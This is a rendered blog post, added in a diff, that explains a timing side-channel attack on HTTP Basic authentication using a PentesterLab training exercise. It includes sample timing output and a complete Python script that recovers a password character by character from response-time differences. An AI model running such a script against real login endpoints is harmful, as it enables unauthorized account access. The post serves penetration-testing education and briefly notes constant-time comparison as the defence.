@@ -1,0 +1,98 @@
+I"M+<h2 id="background">Background</h2>
+<p>Non-constant string comparison time can be a vulnerablity of Basic web authentication. If a web developer did not set up constant response time, attackers may get the password by comparing response time of requests. In this article, we will use <a href="https://pentesterlab.com/exercises/web_for_pentester_II">Web for Pentester II</a> authentication exercise 2 as an example.</p>
+
+<h2 id="basics">Basics</h2>
+<p><img src="/img/2015-08-21-authentication-timing-attack.png" alt="auth page" width="500px" />
+The process of authenticating is as the following:</p>
+<ol>
+  <li>The browser sends a HTTP authentication request.</li>
+  <li>The server compares the strings, and sends response.</li>
+</ol>
+
+<p>There are other types of auth requests than Basic, such as Digest and custom authentication. The username and password are concealed in the HTTP header. This is the header of Basic Authentication, which is the type of authentication in this example.</p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/authentication/example2</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">http://192.168.56.101</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Basic dXNlcm5hbWU6cGFzc3dvcmQ=</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">dXNlcm5hbWU6cGFzc3dvcmQ=</code> is the base64 code of <code class="language-plaintext highlighter-rouge">username:password</code>. The response will give you the status, which is whether you are authenticated or not, and some other content. Status code 200 is success, and 401 is fail.</p>
+
+<h2 id="how-to">How to</h2>
+<p>Suppose the actual password is <code class="language-plaintext highlighter-rouge">abcde</code>. Comparing <code class="language-plaintext highlighter-rouge">abcde</code> with <code class="language-plaintext highlighter-rouge">ab123</code> and <code class="language-plaintext highlighter-rouge">abc123</code>, the second one takes more time than the first one. With <code class="language-plaintext highlighter-rouge">ab123</code>, it compares 3 characters, and stops at the third letter. With <code class="language-plaintext highlighter-rouge">abc123</code>, it compares 4 letters, and stops at the fourth character. Based on this time difference, you could get the correct characters by comparing the response time of auth requests.</p>
+
+<h2 id="details">Details</h2>
+<p>Write a script to send authentication requests, and jot down the response time automatically. For example, this is a part of my ouput.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">$ </span>python ex2.py
+ 0 0 1.408078
+ 1 1 1.408148
+ 2 2 1.408747
+...
+23 n 1.408357
+24 o 1.408269
+25 p 1.609422
+26 q 1.407573
+27 r 1.406407
+...
+<span class="nt">--------------------</span>
+Suggest:  25
+Select one: 25
+...
+ 1 p1 1.607937
+ 2 p2 1.608372
+ 3 p3 1.607752
+ 4 p4 1.810275
+ 5 p5 1.608626
+ 6 p6 1.609457
+...
+<span class="nt">--------------------</span>
+Suggest:  4
+Select one: 4
+...
+ 0 p40 1.809672
+ 1 p41 1.810446
+ 2 p42 1.808867
+...</code></pre></figure>
+
+<p>The output <code class="language-plaintext highlighter-rouge">0 p40 1.809672</code> means <code class="language-plaintext highlighter-rouge">Index password response_time</code>. In the first loop, I send requests with one character as password. “p” took longer to respond, which indicated that p is likely to be contained in the password. With the correct bit confirmed, we can then test the next byte. It stops when it finds the correct password (getting response 200).</p>
+
+<h3 id="script">Script</h3>
+<p>In this example, Python 2.7 was used to send requests and count time. <code class="language-plaintext highlighter-rouge">Requests: HTTP for Humans</code> is an easy-to-use library for HTTP requests. time.time() is used to measure the response time. Note that time.clock() and time.time() is different. clock() counts the processing time with respect to the CPU clock, while time() counts the wall clock time, considering other factors such as network latency.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="nb">dict</span> <span class="o">=</span> <span class="p">[</span><span class="s">'0'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">,</span> <span class="s">'5'</span><span class="p">,</span> <span class="s">'6'</span><span class="p">,</span> <span class="s">'7'</span><span class="p">,</span> <span class="s">'8'</span><span class="p">,</span> <span class="s">'9'</span><span class="p">,</span> <span class="s">'a'</span><span class="p">,</span> <span class="s">'b'</span><span class="p">,</span> <span class="s">'c'</span><span class="p">,</span> <span class="s">'d'</span><span class="p">,</span> <span class="s">'e'</span><span class="p">,</span> <span class="s">'f'</span><span class="p">,</span> <span class="s">'g'</span><span class="p">,</span> <span class="s">'h'</span><span class="p">,</span> <span class="s">'i'</span><span class="p">,</span> <span class="s">'j'</span><span class="p">,</span> <span class="s">'k'</span><span class="p">,</span> <span class="s">'l'</span><span class="p">,</span>
+        <span class="s">'m'</span><span class="p">,</span> <span class="s">'n'</span><span class="p">,</span> <span class="s">'o'</span><span class="p">,</span> <span class="s">'p'</span><span class="p">,</span> <span class="s">'q'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="s">'s'</span><span class="p">,</span> <span class="s">'t'</span><span class="p">,</span> <span class="s">'u'</span><span class="p">,</span> <span class="s">'v'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="s">'x'</span><span class="p">,</span> <span class="s">'y'</span><span class="p">,</span> <span class="s">'z'</span><span class="p">]</span>
+<span class="n">psw</span> <span class="o">=</span> <span class="s">''</span>
+<span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://192.168.56.101/authentication/example2'</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s">'hacker'</span><span class="p">,</span> <span class="s">'hacker'</span><span class="p">))</span>
+<span class="n">psw_found</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">greatest</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">dict</span><span class="p">)):</span>
+        <span class="n">current_psw</span> <span class="o">=</span> <span class="n">psw</span> <span class="o">+</span> <span class="nb">dict</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://192.168.56.101/authentication/example2'</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s">'hacker'</span><span class="p">,</span> <span class="n">current_psw</span><span class="p">))</span>
+        <span class="n">taken</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>
+        <span class="k">if</span> <span class="n">greatest</span> <span class="o">&lt;</span> <span class="n">taken</span><span class="p">:</span>
+            <span class="n">greatest</span> <span class="o">=</span> <span class="n">taken</span>
+            <span class="n">index</span> <span class="o">=</span> <span class="n">i</span>
+        <span class="k">print</span> <span class="s">'{0:2d} {1:1s} {2:4f}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">psw</span> <span class="o">+</span> <span class="nb">dict</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">taken</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+            <span class="n">psw</span> <span class="o">+=</span> <span class="nb">dict</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+            <span class="k">print</span> <span class="s">'password found: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">psw</span><span class="p">)</span>
+            <span class="n">psw_found</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="k">break</span>
+    <span class="k">if</span> <span class="n">psw_found</span><span class="p">:</span>
+        <span class="k">break</span>
+    <span class="k">print</span> <span class="s">'--------------------'</span>
+    <span class="n">suggest</span> <span class="o">=</span> <span class="n">index</span>
+    <span class="k">print</span> <span class="s">'Suggest: '</span><span class="p">,</span> <span class="n">suggest</span>
+    <span class="n">select</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'Select one: '</span><span class="p">)</span>
+    <span class="n">psw</span> <span class="o">+=</span> <span class="nb">dict</span><span class="p">[</span><span class="n">select</span><span class="p">]</span></code></pre></figure>
+
+<h3 id="prevention">Prevention</h3>
+<p>To prevent this vulnerability, either have a constant response time or use a more secure authentication technique.</p>
+:ET
